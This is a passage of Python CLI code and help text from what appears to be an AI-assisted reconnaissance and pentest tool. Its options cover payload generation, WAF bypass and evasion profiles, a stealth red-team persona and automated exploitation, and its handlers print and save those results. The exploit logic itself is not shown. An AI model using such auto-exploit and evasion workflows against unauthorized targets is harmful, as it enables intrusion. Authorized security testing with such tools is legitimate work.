    ADVANCED FEATURES:
        # Attack chain prediction from reconnaissance data
        reconcli aicli --chain-predict --persona bugbounty --verbose

        # Automated exploitation attempts
        reconcli aicli --auto-exploit --persona pentester --cache

        # Advanced attack simulation scenarios
        reconcli aicli --attack-simulation webapp --simulation-scenarios apt,redteam

        # Generate compliance reports
        reconcli aicli --compliance-report scan_results.json --compliance-framework nist

    PERFORMANCE & CACHING:
        # Enable caching for faster responses
        reconcli aicli --prompt "Generate payloads" --cache --cache-max-age 12

        # View cache statistics
        reconcli aicli --cache-stats

        # Clear all cached responses
        reconcli aicli --clear-cache

        # Custom cache directory
        reconcli aicli --payload xss --cache --cache-dir /tmp/my_cache

    DATABASE STORAGE:
        # Store all AI results in SQLite database
        reconcli aicli --store-db /path/to/analysis.db --prompt "Analyze target"

        # Combined cache and database storage
        reconcli aicli --cache --store-db results.db --payload sqli --context mysql

        # Store vulnerability scan results
        reconcli aicli --vuln-scan endpoints.txt --store-db vuln_assessment.db

        # Store reconnaissance plans with database tracking
        reconcli aicli --plan example.com --store-db recon_plans.db --persona pentester

        # View database statistics (includes DB stats when --store-db used)
        reconcli aicli --cache-stats

    SESSION MANAGEMENT:
        # Create new session for target
        reconcli aicli --new-session example.com --plan example.com --persona pentester

        # Resume existing session
        reconcli aicli --session abc123 --interactive

        # Save chat history
        reconcli aicli --interactive --save-chat my_analysis_session

        # Load previous chat
        reconcli aicli --load-chat my_analysis_session --interactive

    CHATLOG-DRIVEN RECON:
        # Enable AI-powered next step suggestions
        reconcli aicli --plan target.com --enable-chatlog --auto-analyze --suggest-next

        # View detailed session insights
        reconcli aicli --chatlog-insights --session session_id

        # Custom confidence threshold for suggestions
        reconcli aicli --vuln-scan endpoints.txt --enable-chatlog --chatlog-threshold 0.8

    SPECIALIZED PERSONAS:
        # Red Team operations (stealth, evasion, APT tactics)
        reconcli aicli --payload xss --persona redteam --steganography

        # Bug Bounty hunting (quick wins, automation)
        reconcli aicli --vuln-scan targets.txt --persona bugbounty --scan-type quick

        # Professional penetration testing
        reconcli aicli --plan corporate.com --persona pentester --scope comprehensive

        # Educational/training mode
        reconcli aicli --prompt "Explain OWASP Top 10" --persona trainer

        # OSINT operations (passive intelligence)
        reconcli aicli --analyze target.com --persona osint --save-chat osint_analysis

    WAF BYPASS & EVASION:
        # Cloudflare WAF bypass
        reconcli aicli --payload sqli --waf-profile cloudflare --encoding url

        # Multiple encoding chains
        reconcli aicli --payload xss --encoding-chains 3 --steganography

        # Advanced obfuscation techniques
        reconcli aicli --payload ssti --mutate --effectiveness-scoring

    LOCAL LLM SUPPORT:
        # Use local Ollama instance
        reconcli aicli --local-llm --local-llm-model llama2 --prompt "Analyze target"

        # Custom local LLM endpoint
        reconcli aicli --local-llm --local-llm-endpoint http://192.168.1.100:11434

    🎭 PERSONAS GUIDE:
        redteam    → Stealth operations, evasion techniques, APT-style tactics
        bugbounty  → Quick wins, high-impact vulnerabilities, automation focus  
        pentester  → Professional methodology, compliance, detailed documentation
        trainer    → Educational approach, step-by-step explanations, learning
        osint      → Passive intelligence, public sources, zero footprint

    📊 SCAN TYPES:
        quick          → Fast common vulnerability scan (XSS, SQLi, CSRF)
        comprehensive  → Complete assessment with advanced techniques
        focused        → Technology-specific vulnerability testing
        deep           → APT simulation, zero-day discovery, advanced threats
        compliance     → OWASP Top 10, PCI DSS, GDPR, NIST assessments

    🛡️ WAF PROFILES:
        auto       → Automatic WAF detection and bypass selection
        cloudflare → Cloudflare-specific bypass techniques
        aws        → AWS WAF evasion methods
        azure      → Azure Application Gateway bypasses
        akamai     → Akamai security evasion techniques

    ⚙️ CONFIGURATION:
        # Save current configuration
        reconcli aicli --save-config /path/to/config.json

        # Load custom configuration
        reconcli aicli --config /path/to/config.json --interactive

        # Enable performance monitoring
        reconcli aicli --performance-monitoring --verbose

    📋 INTEGRATION WITH OTHER RECONCLI MODULES:
        # Use with subdomain enumeration results
        reconcli subdocli --domain example.com --export json
        reconcli aicli --vuln-scan subdomains.json --integration

        # Chain with HTTP discovery
        reconcli httpcli --input domains.txt --export json  
        reconcli aicli --vuln-scan http_results.json --scan-type comprehensive

        # Analyze directory brute force results
        reconcli dirbcli --url https://example.com --export json
        reconcli aicli --vuln-scan directories.json --persona bugbounty

    🔧 ADVANCED CONFIGURATION EXAMPLES:
        # Maximum performance configuration
        reconcli aicli --cache --parallel --max-workers 8 --rate-limit 120 \\
                       --performance-monitoring --effectiveness-scoring

        # Security-focused stealth configuration  
        reconcli aicli --persona redteam --steganography --encoding-chains 3 \\
                       --waf-profile auto --local-llm

        # Bug bounty optimization
        reconcli aicli --persona bugbounty --scan-type quick --cache \\
                       --parallel --auto-exploit --chain-predict

        # Professional pentest setup
        reconcli aicli --persona pentester --scan-type comprehensive \\
                       --compliance-framework comprehensive --enable-chatlog \\
                       --auto-analyze --suggest-next

    📈 PERFORMANCE TIPS:
        • Enable caching (--cache) for repeated similar queries
        • Use parallel processing (--parallel) for multiple targets
        • Set appropriate cache max age based on assessment timeline
        • Use local LLMs for sensitive environments
        • Enable performance monitoring to track usage patterns

    🔐 SECURITY CONSIDERATIONS:
        • API keys are read from environment variables
        • Local LLM support for air-gapped environments
        • Chat history encryption available
        • Steganographic payload obfuscation for evasion
        • Multiple encoding chains for advanced WAF bypass

    💡 PRO TIPS:
        • Start with --persona trainer to learn techniques
        • Use --interactive mode for exploratory analysis
        • Combine --chain-predict with --auto-exploit for automated workflows
        • Save important sessions with --save-chat for later reference
        • Use --compliance-report for formal assessment documentation
        • Enable --chatlog-driven mode for AI-guided reconnaissance
    """
    # Initialize configuration
    global ai_assistant

    # Update configuration from CLI options
    if config or cache or parallel or local_llm or performance_monitoring or store_db:
        # Create new assistant with updated config
        config_updates = ReconCLIConfig()

        # Cache configuration
        if cache:
            config_updates.cache.enabled = True
            if cache_dir:
                config_updates.cache.cache_dir = cache_dir
            else:
                # Use default cache directory
                config_updates.cache.cache_dir = str(
                    Path.home() / ".reconcli" / "ai_sessions" / "cache"
                )
            config_updates.cache.max_age_hours = cache_max_age

        # Database storage configuration - store path for later initialization
        db_path_to_init = None
        if store_db:
            db_path_to_init = store_db if store_db.endswith(".db") else f"{store_db}.db"
            click.echo(f"🗄️  Database storage enabled: {db_path_to_init}")

        # Parallel processing configuration
        if parallel:
            config_updates.parallel.enabled = True
            config_updates.parallel.max_workers = max_workers
            config_updates.parallel.rate_limit_per_minute = rate_limit

        # Local LLM configuration
        if local_llm:
            config_updates.local_llm_enabled = True
            config_updates.local_llm_endpoint = local_llm_endpoint
            config_updates.local_llm_model = local_llm_model

        # WAF configuration
        config_updates.waf.profile = waf_profile
        config_updates.waf.encoding_chains = encoding_chains

        # Performance monitoring
        if performance_monitoring:
            config_updates.performance_monitoring = True

        # Chatlog-driven recon configuration
        if enable_chatlog or auto_analyze or suggest_next:
            config_updates.chatlog.enabled = True
            if auto_analyze:
                config_updates.chatlog.auto_analyze_results = True
            if suggest_next:
                config_updates.chatlog.suggest_next_steps = True
            config_updates.chatlog.confidence_threshold = chatlog_threshold
            config_updates.chatlog.max_suggestions = max_suggestions

        # Advanced features
        config_updates.payload_scoring = effectiveness_scoring
        config_updates.steganography_enabled = steganography

        # Verbose logging
        config_updates.verbose_logging = verbose

        # Create new assistant with updated configuration
        ai_assistant = AIReconAssistant(config_file=config)

        # Update the configuration manually
        for attr_name in dir(config_updates):
            if not attr_name.startswith("_"):
                setattr(
                    ai_assistant.config, attr_name, getattr(config_updates, attr_name)
                )

        # Initialize database storage AFTER creating new assistant
        if db_path_to_init:
            ai_assistant._init_database_storage(db_path_to_init)

        # Update cache configuration after config changes
        ai_assistant.update_cache_config()

        # Reinitialize components if needed
        if cache and not ai_assistant.cache_manager:
            ai_assistant.cache_manager = ai_assistant._initialize_cache()

        if parallel and not ai_assistant.executor:
            ai_assistant.executor = ThreadPoolExecutor(max_workers=max_workers)
            ai_assistant.rate_limiter = ai_assistant._initialize_rate_limiter()

        if local_llm and not ai_assistant.local_llm_client:
            ai_assistant.local_llm_client = ai_assistant._initialize_local_llm()

        if performance_monitoring and not ai_assistant.performance_metrics:
            ai_assistant._initialize_performance_monitoring()

    # Handle cache operations
    if clear_cache:
        # Try to clear cache even if cache manager is not initialized
        if ai_assistant.cache_manager:
            cache_dir_path = Path(ai_assistant.config.cache.cache_dir)
        else:
            # Use default cache directory
            cache_dir_path = Path.home() / ".reconcli" / "ai_sessions" / "cache"

        try:
            count = 0
            if cache_dir_path.exists():
                for cache_file in cache_dir_path.glob("*.json"):
                    try:
                        cache_file.unlink()
                        count += 1
                    except Exception:
                        pass
            click.secho(
                f"🗑️  Cleared {count} cached responses from {cache_dir_path}",
                fg="green",
            )
        except Exception as e:
            click.secho(f"❌ Failed to clear cache: {e}", fg="red")
        return

    if cache_stats:
        # Handle cache stats at the end after all initializations
        pass

    # Save configuration if requested
    if save_config:
        if ai_assistant.save_config(save_config):
            click.secho(f"✅ Configuration saved to: {save_config}", fg="green")
        else:
            click.secho(f"❌ Failed to save configuration to: {save_config}", fg="red")

    if verbose:
        click.secho("🧠 AI-Powered Reconnaissance Assistant", fg="cyan", bold=True)
        click.secho("Part of the ReconCLI Cyber-Squad from the Future", fg="blue")

        # Show configuration status
        if ai_assistant.config.cache.enabled:
            click.secho("🗄️  Caching: ENABLED", fg="green")
        if ai_assistant.config.parallel.enabled:
            click.secho(
                f"⚡ Parallel processing: ENABLED ({ai_assistant.config.parallel.max_workers} workers)",
                fg="green",
            )
        if ai_assistant.config.local_llm_enabled:
            click.secho(
                f"🏠 Local LLM: ENABLED ({ai_assistant.config.local_llm_endpoint})",
                fg="green",
            )
        if ai_assistant.config.performance_monitoring:
            click.secho("📊 Performance monitoring: ENABLED", fg="green")

        click.secho(
            f"Available providers: {', '.join(ai_assistant.get_available_providers())}",
            fg="green",
        )
        if persona:
            click.secho(f"Active persona: {persona.upper()}", fg="magenta", bold=True)
        if waf_profile != "auto":
            click.secho(f"WAF profile: {waf_profile.upper()}", fg="yellow")

    # Handle new chain prediction and auto-exploitation features
    if chain_predict:
        if verbose:
            click.secho(
                "[*] Analyzing reconnaissance data for attack chain prediction...",
                fg="cyan",
            )

        try:
            # Get reconnaissance data from various sources
            recon_data = ai_assistant.gather_recon_data()

            if not recon_data:
                click.secho(
                    "❌ No reconnaissance data found. Please run other ReconCLI modules first.",
                    fg="red",
                )
                return

            # Perform attack chain prediction
            attack_chains = ai_assistant.predict_attack_chains(recon_data, persona)

            # Display results
            click.secho("\n🔗 Attack Chain Predictions", fg="cyan", bold=True)
            click.secho(
                f"Based on reconnaissance data analysis using {persona} persona",
                fg="blue",
            )

            for i, chain in enumerate(attack_chains.get("chains", []), 1):
                click.secho(
                    f"\n{i}. {chain.get('name', 'Unknown Chain')}",
                    fg="yellow",
                    bold=True,
                )
                click.secho(
                    f"   Probability: {chain.get('probability', 0):.1%}", fg="white"
                )
                click.secho(
                    f"   Complexity: {chain.get('complexity', 'Medium')}", fg="white"
                )
                click.secho(f"   Steps: {len(chain.get('steps', []))}", fg="white")

                if verbose:
                    for j, step in enumerate(chain.get("steps", []), 1):
                        click.secho(
                            f"     {j}. {step.get('description', 'Unknown step')}",
                            fg="cyan",
                        )
                        if step.get("tools"):
                            click.secho(
                                f"        Tools: {', '.join(step['tools'])}", fg="blue"
                            )

            # Save results if requested
            if attack_chains:
                timestamp = int(time.time())
                output_file = f"attack_chains_{timestamp}.json"
                try:
                    with open(output_file, "w") as f:
                        json.dump(attack_chains, f, indent=2)
                    click.secho(
                        f"💾 Attack chain predictions saved to: {output_file}",
                        fg="green",
                    )
                except Exception as e:
                    click.secho(f"❌ Failed to save attack chains: {e}", fg="red")

        except Exception as e:
            click.secho(f"❌ Attack chain prediction failed: {e}", fg="red")

        return

    if auto_exploit:
        if verbose:
            click.secho(
                "[*] Starting automated exploitation based on reconnaissance findings...",
                fg="cyan",
            )

        try:
            # Get reconnaissance data
            recon_data = ai_assistant.gather_recon_data()

            if not recon_data:
                click.secho(
                    "❌ No reconnaissance data found. Please run other ReconCLI modules first.",
                    fg="red",
                )
                return

            # Perform automated exploitation attempts
            exploit_results = ai_assistant.auto_exploit(recon_data, persona)

            # Display results
            click.secho("\n💥 Automated Exploitation Results", fg="cyan", bold=True)
            click.secho(f"Persona: {persona}", fg="blue")
            click.secho(
                f"Targets analyzed: {exploit_results.get('targets_analyzed', 0)}",
                fg="blue",
            )
            click.secho(
                f"Exploits attempted: {exploit_results.get('exploits_attempted', 0)}",
                fg="blue",
            )
            click.secho(
                f"Successful exploits: {exploit_results.get('successful_exploits', 0)}",
                fg="green",
            )

            # Show successful exploits
            for exploit in exploit_results.get("successful", []):
                click.secho(
                    f"\n✅ {exploit.get('target', 'Unknown target')}",
                    fg="green",
                    bold=True,
                )
                click.secho(
                    f"   Vulnerability: {exploit.get('vulnerability', 'Unknown')}",
                    fg="white",
                )
                click.secho(
                    f"   Severity: {exploit.get('severity', 'Medium')}", fg="white"
                )
                click.secho(
                    f"   Method: {exploit.get('method', 'Unknown')}", fg="white"
                )
                if exploit.get("evidence"):
                    click.secho(f"   Evidence: {exploit['evidence']}", fg="cyan")

            # Show failed attempts if verbose
            if verbose and exploit_results.get("failed"):
                click.secho("\n❌ Failed Exploitation Attempts:", fg="red", bold=True)
                for failed in exploit_results.get("failed", []):
                    click.secho(
                        f"   {failed.get('target', 'Unknown')}: {failed.get('reason', 'Unknown reason')}",
                        fg="red",
                    )

            # Show recommendations
            if exploit_results.get("recommendations"):
                click.secho("\n💡 Recommendations:", fg="yellow", bold=True)
                for rec in exploit_results.get("recommendations", []):
                    click.secho(f"   • {rec}", fg="yellow")

            # Save results
            timestamp = int(time.time())
            output_file = f"auto_exploit_results_{timestamp}.json"
            try:
                with open(output_file, "w") as f:
                    json.dump(exploit_results, f, indent=2)
                click.secho(
                    f"💾 Exploitation results saved to: {output_file}", fg="green"
                )
            except Exception as e:
                click.secho(f"❌ Failed to save results: {e}", fg="red")

        except Exception as e:
            click.secho(f"❌ Automated exploitation failed: {e}", fg="red")

        return

    # Generate compliance assessment report
    if compliance_report:
        if verbose:
            click.secho(
                f"[*] Generating compliance report from {compliance_report}...",
                fg="cyan",
            )

        if not os.path.exists(compliance_report):
            click.secho(
                f"❌ Compliance report file not found: {compliance_report}", fg="red"
            )
            return

        try:
            with open(compliance_report, "r") as f:
                scan_data = json.load(f)
        except Exception as e:
            click.secho(
                f"❌ Failed to parse compliance report file: {str(e)}", fg="red"
            )
            return

        compliance_data = ai_assistant.generate_compliance_report(
            scan_data, compliance_framework, persona
        )

        if "error" in compliance_data:
            click.secho(f"❌ {compliance_data['error']}", fg="red")
            return

        click.secho("\n📋 Compliance Assessment Report", fg="cyan", bold=True)
        click.secho(f"Framework: {compliance_framework.upper()}", fg="blue")
        click.secho(
            f"Generated: {compliance_data['report_metadata']['generated_at']}",
            fg="blue",
        )

        if persona:
            click.secho(f"Persona: {persona.upper()}", fg="magenta")

        # Display executive summary
        summary = compliance_data["executive_summary"]
        click.secho("\n📊 Executive Summary:", fg="yellow", bold=True)
        click.secho(f"  Overall Score: {summary['overall_score']}/10", fg="white")
        click.secho(
            f"  Compliance: {summary['compliance_percentage']:.1f}%", fg="white"
        )
        click.secho(f"  Critical Issues: {summary['critical_issues']}", fg="red")
        click.secho(f"  Total Findings: {summary['total_findings']}", fg="white")

        # Display framework scores
        if verbose and summary["framework_scores"]:
            click.secho("\n🎯 Framework Scores:", fg="cyan", bold=True)
            for framework_name, score in summary["framework_scores"].items():
                color = "green" if score >= 8 else "yellow" if score >= 6 else "red"
                click.secho(f"  {framework_name.upper()}: {score:.1f}/10", fg=color)

        # Display compliance metrics
        if verbose:
            metrics = compliance_data["compliance_metrics"]
            click.secho("\n📈 Compliance Metrics:", fg="magenta", bold=True)
            click.secho(
                f"  Test Coverage: {metrics['test_coverage']} tests", fg="white"
            )
            click.secho(
                f"  Automation Score: {metrics['automation_score']}%", fg="white"
            )
            click.secho(
                f"  Documentation Score: {metrics['documentation_score']}%", fg="white"
            )
            click.secho(
                f"  Monitoring Score: {metrics['monitoring_score']}%", fg="white"
            )

        # Display AI-generated report
        click.secho(
            f"\n🧠 Detailed Assessment:\n{compliance_data['ai_generated_report']}",
            fg="green",
        )

        # Display remediation matrix
        if compliance_data["remediation_matrix"]:
            remediation = compliance_data["remediation_matrix"]
            click.secho("\n🔧 Remediation Roadmap:", fg="yellow", bold=True)

            click.secho("  Immediate Actions:", fg="red", bold=True)
            for action in remediation["immediate_actions"]:
                click.secho(f"    • {action}", fg="red")

            click.secho("  Short-term Improvements:", fg="yellow", bold=True)
            for action in remediation["short_term"]:
                click.secho(f"    • {action}", fg="yellow")

            if verbose:
                click.secho("  Long-term Strategic:", fg="green", bold=True)
                for action in remediation["long_term"]:
                    click.secho(f"    • {action}", fg="green")

        # Display KPIs for monitoring
        if verbose and compliance_data["monitoring_kpis"]:
            click.secho("\n📊 Monitoring KPIs:", fg="blue", bold=True)
            for kpi in compliance_data["monitoring_kpis"]:
                trend_color = (
                    "green"
                    if kpi["trend"] == "improving"
                    else "yellow" if kpi["trend"] == "stable" else "red"
                )
                click.secho(
                    f"  {kpi['kpi']}: {kpi['current']} (target: {kpi['target']}) [{kpi['trend']}]",
                    fg=trend_color,
                )

        # Save compliance report to file
        compliance_filename = (
            f"compliance_report_{compliance_framework}_{int(time.time())}.json"
        )
        with open(compliance_filename, "w") as f:
            json.dump(compliance_data, f, indent=2)

        if verbose:
            click.secho(
                f"💾 Compliance report saved to: {compliance_filename}", fg="green"
            )

        # Generate markdown compliance report
        markdown_filename = (
            f"compliance_report_{compliance_framework}_{int(time.time())}.md"
        )
        markdown_content = f"""# Compliance Assessment Report

**Framework:** {compliance_framework.upper()}
**Generated:** {compliance_data["report_metadata"]["generated_at"]}
**Persona:** {persona or "default"}

## Executive Summary

### Compliance Scores
- **Overall Score:** {summary["overall_score"]}/10
- **Compliance Percentage:** {summary["compliance_percentage"]:.1f}%
- **Critical Issues:** {summary["critical_issues"]}
- **Total Findings:** {summary["total_findings"]}

### Framework Scores
{chr(10).join(f"- **{fw.upper()}:** {score:.1f}/10" for fw, score in summary["framework_scores"].items())}

## Technical Assessment

{compliance_data["ai_generated_report"]}

## Remediation Roadmap

### Immediate Actions (0-30 days)
{chr(10).join(f"- {action}" for action in remediation["immediate_actions"])}


### Short-term Improvements (30-90 days)
{chr(10).join(f"- {action}" for action in remediation["short_term"])}

### Long-term Strategic (90+ days)
{chr(10).join(f"- {action}" for action in remediation["long_term"])}

## Monitoring KPIs

{chr(10).join(f"- **{kpi['kpi']}:** {kpi['current']} (target: {kpi['target']}) - {kpi['trend']}" for kpi in compliance_data["monitoring_kpis"])}

---
*Report generated by ReconCLI AI Compliance Assistant*
"""

        with open(markdown_filename, "w") as f:
            f.write(markdown_content)

        click.secho(
            f"📄 Markdown compliance report saved to: {markdown_filename}", fg="green"
        )

        # Save chat if requested
        if save_chat:
            if ai_assistant.save_chat_history(save_chat):
                click.secho(f"💾 Chat saved to: {save_chat}", fg="green")
            else:
                click.secho(f"❌ Failed to save chat: {save_chat}", fg="red")

        return

    # Generate advanced attack simulation
    if attack_simulation:
        if verbose:
            click.secho(
                f"[*] Generating attack simulation: {attack_simulation}...", fg="cyan"
            )

        # Load environment configuration if provided
        env_config = {}
        if environment_config:
            if os.path.exists(environment_config):
                try:
                    with open(environment_config, "r") as f:
                        env_config = json.load(f)
                except Exception as e:
                    click.secho(
                        f"❌ Failed to load environment config: {str(e)}", fg="red"
                    )
                    return
            else:
                click.secho(
                    f"❌ Environment config file not found: {environment_config}",
                    fg="red",
                )
                return
        else:
            # Default environment config
            env_config = {
                "target_type": "web_application",
                "technology_stack": ["python", "postgresql", "nginx"],
                "cloud_provider": "aws",
                "security_controls": ["waf", "ids", "logging"],
                "network_segmentation": "basic",
            }

        # Parse simulation scenarios
        scenarios = (
            simulation_scenarios.split(",")
            if simulation_scenarios
            else ["apt", "redteam"]
        )
        scenarios = [s.strip() for s in scenarios]

        # Create session if not exists
        if not ai_assistant.current_session:
            ai_assistant.create_session(attack_simulation)

        simulation_data = ai_assistant.generate_advanced_attack_simulation(
            env_config, scenarios, persona
        )

        click.secho("\n⚔️  Advanced Attack Simulation", fg="red", bold=True)
        click.secho(f"Target: {attack_simulation}", fg="blue")
        click.secho(f"Scenarios: {', '.join(scenarios)}", fg="yellow")

        if persona:
            click.secho(f"Persona: {persona.upper()}", fg="magenta")

        # Display environment configuration
        if verbose:
            click.secho("\n🏗️  Target Environment:", fg="cyan", bold=True)
            for key, value in env_config.items():
                if isinstance(value, list):
                    click.secho(f"  {key}: {', '.join(value)}", fg="white")
                else:
                    click.secho(f"  {key}: {value}", fg="white")

        # Display simulation overview
        click.secho("\n🎯 Attack Simulation Plan:", fg="green", bold=True)
        click.secho(f"{simulation_data['ai_generated_simulation']}", fg="white")

        # Display kill chain mapping
        if verbose and simulation_data.get("attack_kill_chain"):
            kill_chain = simulation_data["attack_kill_chain"]
            click.secho("\n🔗 Cyber Kill Chain:", fg="yellow", bold=True)
            for phase, techniques in kill_chain.items():
                click.secho(f"  {phase.upper()}:", fg="yellow")
                for technique in techniques[:3]:  # Show first 3 techniques
                    click.secho(f"    • {technique}", fg="white")

        # Display MITRE techniques
        if verbose and simulation_data.get("mitre_techniques"):
            mitre = simulation_data["mitre_techniques"]
            click.secho("\n🎯 MITRE ATT&CK Techniques:", fg="magenta", bold=True)
            total_techniques = sum(len(techniques) for techniques in mitre.values())
            click.secho(f"  Total Techniques: {total_techniques}", fg="white")
            for tactic, techniques in list(mitre.items())[:3]:  # Show first 3 tactics
                click.secho(
                    f"  {tactic.upper()}: {', '.join(techniques[:3])}", fg="white"
                )

        # Display simulation timeline
        if simulation_data.get("simulation_timeline"):
            timeline = simulation_data["simulation_timeline"]
            click.secho("\n⏱️  Simulation Timeline:", fg="blue", bold=True)
            for phase, details in timeline.items():
                click.secho(
                    f"  {phase.upper()} ({details['duration']}): {', '.join(details['activities'])}",
                    fg="white",
                )

        # Save simulation data to file
        simulation_filename = (
            f"attack_simulation_{'_'.join(scenarios)}_{int(time.time())}.json"
        )
        with open(simulation_filename, "w") as f:
            json.dump(simulation_data, f, indent=2)

        if verbose:
            click.secho(
                f"💾 Attack simulation saved to: {simulation_filename}", fg="green"
            )

        # Generate simulation playbook
        playbook_filename = (
            f"attack_playbook_{'_'.join(scenarios)}_{int(time.time())}.md"
        )
        playbook_content = f"""# Advanced Attack Simulation Playbook

**Target:** {attack_simulation}
**Scenarios:** {", ".join(scenarios)}
**Generated:** {simulation_data["simulation_metadata"]["generated_at"]}
**Persona:** {persona or "default"}

## Environment Configuration

{chr(10).join(f"- **{key}:** {value if not isinstance(value, list) else ', '.join(value)}" for key, value in env_config.items())}

## Simulation Plan

{simulation_data["ai_generated_simulation"]}

## Cyber Kill Chain

{chr(10).join(f"### {phase.title()}" + chr(10) + chr(10).join(f"- {technique}" for technique in techniques) for phase, techniques in simulation_data["attack_kill_chain"].items())}

## MITRE ATT&CK Techniques

{chr(10).join(f"### {tactic.title()}" + chr(10) + chr(10).join(f"- {technique}" for technique in techniques) for tactic, techniques in simulation_data["mitre_techniques"].items())}

## Success Metrics

{chr(10).join(f"- **{metric}:** {description}" for metric, description in simulation_data["success_metrics"].items())}

---
*Playbook generated by ReconCLI AI Attack Simulation Engine*
"""

        with open(playbook_filename, "w") as f:
            f.write(playbook_content)

        click.secho(f"📄 Attack playbook saved to: {playbook_filename}", fg="green")

        # Save chat if requested
        if save_chat:
            if ai_assistant.save_chat_history(save_chat):
                click.secho(f"💾 Chat saved to: {save_chat}", fg="green")
            else:
                click.secho(f"❌ Failed to save chat: {save_chat}", fg="red")

        return

    # Generate comprehensive report from attack flow JSON
    if report:
        if verbose:
            click.secho(f"[*] Generating report from {report}...", fg="cyan")

        report_data = ai_assistant.generate_report_from_flow(report, persona)

        if "error" in report_data:
            click.secho(f"❌ {report_data['error']}", fg="red")
            return

        click.secho("\n📊 Security Assessment Report", fg="cyan", bold=True)
        click.secho(f"Source: {report}", fg="blue")
        click.secho(
            f"Generated: {report_data['report_metadata']['generated_at']}", fg="blue"
        )

        if persona:
            click.secho(f"Persona: {persona.upper()}", fg="magenta")

        # Display report summary
        summary = report_data["attack_flow_summary"]
        click.secho("\n⚔️  Attack Flow Summary:", fg="yellow", bold=True)
        click.secho(
            f"  Attack Types: {' → '.join(summary['attack_types'])}", fg="white"
        )
        click.secho(f"  Technique: {summary['technique']}", fg="white")
        click.secho(f"  Target: {summary['target']}", fg="white")
        click.secho(
            f"  Risk Level: {summary['risk_level']}",
            fg="red" if summary["risk_level"] == "CRITICAL" else "yellow",
        )

        # Display risk metrics
        risk_metrics = report_data["risk_metrics"]
        click.secho("\n📈 Risk Assessment:", fg="red", bold=True)
        click.secho(
            f"  Likelihood Score: {risk_metrics['likelihood_score']}/10", fg="white"
        )
        click.secho(f"  Impact Score: {risk_metrics['impact_score']}/10", fg="white")
        click.secho(
            f"  Composite Risk: {risk_metrics['composite_risk_score']}/10", fg="white"
        )
        click.secho(
            f"  Severity: {risk_metrics['severity_rating']}",
            fg="red" if risk_metrics["severity_rating"] == "CRITICAL" else "yellow",
        )

        # Display MITRE analysis
        mitre_analysis = report_data["mitre_analysis"]
        if verbose and mitre_analysis["technique_count"] > 0:
            click.secho("\n🎯 MITRE ATT&CK Analysis:", fg="cyan", bold=True)
            click.secho(
                f"  Mapped Techniques: {mitre_analysis['technique_count']}", fg="white"
            )
            click.secho(
                f"  Coverage Areas: {', '.join(mitre_analysis['coverage_areas'])}",
                fg="white",
            )

        # Display compliance information
        compliance = report_data["compliance_notes"]
        if compliance["applicable_standards"]:
            click.secho("\n⚖️  Compliance Impact:", fg="blue", bold=True)
            click.secho(
                f"  Standards: {len(compliance['applicable_standards'])} requirements",
                fg="white",
            )
            if verbose:
                for std in compliance["applicable_standards"][:5]:  # Show first 5
                    click.secho(f"    • {std}", fg="white")
                if len(compliance["applicable_standards"]) > 5:
                    click.secho(
                        f"    ... and {len(compliance['applicable_standards']) - 5} more",
                        fg="white",
                    )

        # Display AI-generated report
        click.secho(
            f"\n🧠 Detailed Analysis:\n{report_data['ai_generated_report']}", fg="green"
        )

        # Display key recommendations
        if report_data["recommendations"]:
            click.secho("\n💡 Key Recommendations:", fg="yellow", bold=True)
            for i, rec in enumerate(report_data["recommendations"][:10], 1):
                click.secho(f"{i}. {rec}", fg="green")

        # Save report to file
        report_filename = f"security_report_{int(time.time())}.json"
        with open(report_filename, "w") as f:
            json.dump(report_data, f, indent=2)

        if verbose:
            click.secho(f"💾 Report saved to: {report_filename}", fg="green")

        # Also generate markdown report for easy reading
        markdown_filename = f"security_report_{int(time.time())}.md"
        markdown_content = f"""# Security Assessment Report

**Generated:** {report_data["report_metadata"]["generated_at"]}
**Source:** {report}
**Persona:** {persona or "default"}

## Executive Summary

### Attack Flow Details
- **Attack Types:** {" → ".join(summary["attack_types"])}
- **Technique:** {summary["technique"]}
- **Target:** {summary["target"]}
- **Risk Level:** {summary["risk_level"]}

### Risk Assessment
- **Likelihood Score:** {risk_metrics["likelihood_score"]}/10
- **Impact Score:** {risk_metrics["impact_score"]}/10
- **Composite Risk:** {risk_metrics["composite_risk_score"]}/10
- **Severity Rating:** {risk_metrics["severity_rating"]}

## Technical Analysis

{report_data["ai_generated_report"]}

## MITRE ATT&CK Mapping

- **Mapped Techniques:** {mitre_analysis["technique_count"]}
- **Coverage Areas:** {", ".join(mitre_analysis["coverage_areas"])}

## Compliance Impact

{compliance["compliance_summary"]}

### Applicable Standards
{chr(10).join(f"- {std}" for std in compliance["applicable_standards"])}

## Key Recommendations

{chr(10).join(f"{i}. {rec}" for i, rec in enumerate(report_data["recommendations"][:10], 1))}

---
*Report generated by ReconCLI AI Assistant*
"""

        with open(markdown_filename, "w") as f:
            f.write(markdown_content)

        click.secho(f"📄 Markdown report saved to: {markdown_filename}", fg="green")

        # Save chat if requested
        if save_chat:
            if ai_assistant.save_chat_history(save_chat):
                click.secho(f"💾 Chat saved to: {save_chat}", fg="green")
            else:
                click.secho(f"❌ Failed to save chat: {save_chat}", fg="red")

        return

    # List available chat histories
    if list_chats:
        chat_files = ai_assistant.list_chat_files()
        if chat_files:
            click.secho("\n💬 Available Chat Histories:", fg="cyan", bold=True)
            for chat_file in chat_files:
                click.secho(f"  {chat_file}", fg="white")
        else:
            click.secho("No chat histories found.", fg="yellow")
        return

    # Create new session
    if new_session:
        session_id = ai_assistant.create_session(new_session)
        click.secho(
            f"✅ Created new session: {session_id} for target: {new_session}",
            fg="green",
        )
        if verbose:
            click.secho(
                f"Session saved to: {ai_assistant.session_dir / f'{session_id}.json'}",
                fg="blue",
            )

    # Load existing session
    if session:
        if ai_assistant.load_session(session):
            click.secho(f"✅ Loaded session: {session}", fg="green")
            if verbose and ai_assistant.current_session:
                click.secho(f"Target: {ai_assistant.current_session.target}", fg="blue")
        else:
            click.secho(f"❌ Session not found: {session}", fg="red")
            return

    # Load chat history
    if load_chat:
        if ai_assistant.load_chat_history(load_chat):
            click.secho(f"✅ Loaded chat history: {load_chat}", fg="green")
            if verbose and ai_assistant.current_session:
                click.secho(f"Target: {ai_assistant.current_session.target}", fg="blue")
                click.secho(
                    f"Chat entries: {len(ai_assistant.current_session.queries)}",
                    fg="blue",
                )
        else:
            click.secho(f"❌ Chat history not found: {load_chat}", fg="red")
            return

    # Enable prompt mode
    if prompt_mode:
        ai_assistant.enable_prompt_mode()
        if verbose:
            click.secho("🔧 Advanced prompt mode enabled", fg="magenta")

    # Generate multi-stage attack flow
    if attack_flow:
        if verbose:
            click.secho(f"[*] Generating attack flow: {attack_flow}...", fg="cyan")

        # Parse attack types
